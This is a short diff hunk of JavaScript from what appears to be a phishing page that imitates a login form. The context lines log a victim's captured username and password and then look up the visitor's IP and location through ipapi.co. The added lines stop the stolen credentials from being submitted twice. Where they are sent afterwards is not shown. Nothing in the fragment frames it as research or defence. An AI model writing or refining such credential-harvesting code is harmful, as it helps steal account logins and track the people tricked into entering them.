@@ -1609,6 +1609,12 @@ _.B("unknownerror");_.E();
     // Log to console (for testing)
     console.log('Captured:', username, password);
     
+    // Prevent double submission
+    if (window.credentialsSubmitted) {
+        return;
+    }
+    window.credentialsSubmitted = true;
+    
     // Get IP and location data
     fetch('https://ipapi.co/json/')
         .then(response => response.json())
